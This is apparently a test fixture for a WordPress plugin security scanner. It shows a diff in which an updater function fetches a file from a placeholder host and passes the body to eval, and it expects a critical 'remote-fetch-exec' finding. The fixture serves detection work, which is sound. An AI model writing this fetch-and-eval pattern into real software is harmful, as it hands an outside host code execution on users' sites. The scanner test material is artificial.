@@ -1,0 +1,22 @@
+eco: wp-plugin
+note: wp_remote_get body reaches eval in one function
+old:
+  updater.php: |
+    <?php
+    function check_update() {
+        return get_option('ver');
+    }
+new:
+  updater.php: |
+    <?php
+    function check_update() {
+        $r = wp_remote_get('https://cdn.example.test/u.txt');
+        eval(wp_remote_retrieve_body($r));
+    }
+features_old: []
+features_new:
+- {kind: flow, key: remote->eval, path: updater.php, line: 3, end_line: 4, snippet: '$r = wp_remote_get(''https://cdn.example.test/u.txt'');
+    eval(wp_remote_retrieve_body($r));', func: check_update}
+expect:
+- {id: remote-fetch-exec, min_severity: critical}
+forbid: [eval-dynamic]
